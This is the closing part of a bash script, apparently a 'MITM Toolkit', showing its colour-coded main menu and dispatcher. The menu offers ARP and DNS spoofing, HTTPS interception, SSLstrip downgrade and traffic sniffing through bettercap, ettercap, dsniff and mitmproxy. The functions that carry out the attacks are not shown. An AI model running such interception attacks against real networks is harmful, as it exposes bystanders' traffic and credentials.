    echo -e "${CYAN}╚═════════════════════════════════════════════════════╝${NC}"
    pause
}

# ──────────────────── PAUSE ────────────────────
pause() {
    echo ""
    echo -e "${YELLOW}[*] Press Enter to return to menu...${NC}"
    read -r
}

# ──────────────────── MAIN MENU ────────────────────
main_menu() {
    while true; do
        print_banner
        echo -e "${WHITE}  Current Setup:${NC} Interface=${GREEN}${IFACE:-NOT SET}${NC}  Gateway=${GREEN}${GATEWAY:-NOT SET}${NC}  Target=${GREEN}${TARGET:-NOT SET}${NC}"
        echo ""
        echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[SETUP]${NC}                                                   ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}1.${NC}  Check & Install Tools                               ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}2.${NC}  Network Setup (Select Interface)                    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}3.${NC}  Scan Network / Set Target                           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}4.${NC}  Show Current Status                                 ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[BETTERCAP]${NC}                                               ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}5.${NC}  Bettercap - ARP Spoof + Sniffer                     ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}6.${NC}  Bettercap - DNS Spoof                               ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}7.${NC}  Bettercap - Interactive Shell (Full Control)        ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[ETTERCAP]${NC}                                                ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}8.${NC}  Ettercap - ARP MITM (CLI)                           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}9.${NC}  Ettercap - DNS Spoof Plugin                         ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[ARPSPOOF / DSNIFF SUITE]${NC}                                 ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}10.${NC} arpspoof - Bidirectional ARP Poison                 ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}11.${NC} dnsspoof - DNS Spoofing                             ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}12.${NC} urlsnarf - URL Sniffer                              ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[MITMPROXY / SSLSTRIP]${NC}                                    ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}13.${NC} mitmproxy - Transparent HTTPS Intercept             ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}14.${NC} SSLstrip  - HTTPS Downgrade Attack                  ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[COMBO ATTACKS]${NC}                                           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}15.${NC} Bettercap + mitmproxy COMBO                         ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}  ${CYAN}[CAPTURE & LOGS]${NC}                                          ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}16.${NC} tcpdump - Packet Capture / String Extract           ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${WHITE}17.${NC} View Log Files                                      ${YELLOW}║${NC}"
        echo -e "${YELLOW}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${YELLOW}║${NC}   ${RED}18.${NC} Stop ALL Attacks & Restore Network                  ${YELLOW}║${NC}"
        echo -e "${YELLOW}║${NC}   ${RED}0.${NC}  Exit                                                 ${YELLOW}║${NC}"
        echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}[?] Select an option: ${NC}\c"
        read -r option

        case $option in
            1)  check_and_install_tools ;;
            2)  detect_network ;;
            3)  scan_network ;;
            4)  show_status ;;
            5)  run_bettercap_arp ;;
            6)  run_bettercap_dns ;;
            7)  run_bettercap_interactive ;;
            8)  run_ettercap_arp ;;
            9)  run_ettercap_dns ;;
            10) run_arpspoof ;;
            11) run_dnsspoof ;;
            12) run_urlsnarf ;;
            13) run_mitmproxy ;;
            14) run_sslstrip ;;
            15) run_combo_bettercap_mitmproxy ;;
            16) run_tcpdump ;;
            17) view_logs ;;
            18) kill_all_attacks ;;
            0)
                echo -e "${YELLOW}[*] Cleaning up before exit...${NC}"
                kill_all_attacks
                echo -e "${RED}[*] Exiting Anon's MITM Toolkit. Stay legal.${NC}"
                exit 0
                ;;
            *)  echo -e "${RED}[!] Invalid option.${NC}"; sleep 1 ;;
        esac
    done
}

# ──────────────────── ENTRY POINT ────────────────────
check_root
setup_logging
main_menu

